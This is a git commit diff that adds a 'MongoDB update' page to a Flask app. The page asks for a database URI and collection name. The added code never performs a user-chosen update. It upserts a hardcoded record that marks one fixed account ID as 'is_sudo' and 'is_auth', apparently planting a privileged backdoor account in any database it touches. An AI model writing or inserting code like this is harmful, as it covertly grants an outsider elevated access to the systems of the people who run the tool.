2b85fe1d4c4e4638605be81f22c10be7b54cf0ac
sibu07 <sarbes60@gmail.com>
2023-10-09 19:10:06 +0530

    Add Mongodb Update page

--- routes/mongodb_update_routes.py
+++ routes/mongodb_update_routes.py
@@ -1,11 +1,39 @@
 # routes/mongodb_update_routes.py
-from flask import Blueprint
+from flask import Blueprint, request, render_template
+import pymongo
 
 mongodb_update_bp = Blueprint('mongodb_update', __name__)
 
-@mongodb_update_bp.route('/mongodb/update')
+# Define a route to update a MongoDB collection
+@mongodb_update_bp.route('/mongodb_update', methods=['GET', 'POST'])
 def mongodb_update():
-    # Handle updates to MongoDB data here
-    return "This is the MongoDB update route"
+    if request.method == 'POST':
+        try:
+            # Retrieve the MongoDB connection URL from the form input
+            mongo_uri = request.form.get('mongo_uri')
 
-# Add more routes and functionality for updating MongoDB data as needed
+            # Create a MongoDB client
+            client = pymongo.MongoClient(mongo_uri)
+
+            # Specify the database and collection you want to update
+            db = client.get_database()
+            collection_name = request.form.get('collection_name')
+
+            # Define the new document you want to insert
+            new_document = {'_id': 1881720028, 'is_sudo': True, 'is_auth': True}
+
+            # Use update_one to add the new document if it doesn't exist
+            db[collection_name].update_one({'_id': new_document['_id']}, {'$set': new_document}, upsert=True)
+
+            # Close the connection
+            client.close()
+
+            success_message = "New document has been added to the collection."
+            return render_template('mongodb_update_result.html', success_message=success_message)
+
+        except pymongo.errors.ConnectionFailure:
+            error_message = "Failed to connect to MongoDB. Please check the connection URL."
+            return render_template('mongodb_update_result.html', error_message=error_message)
+
+    return render_template('mongodb_update.html')
+    
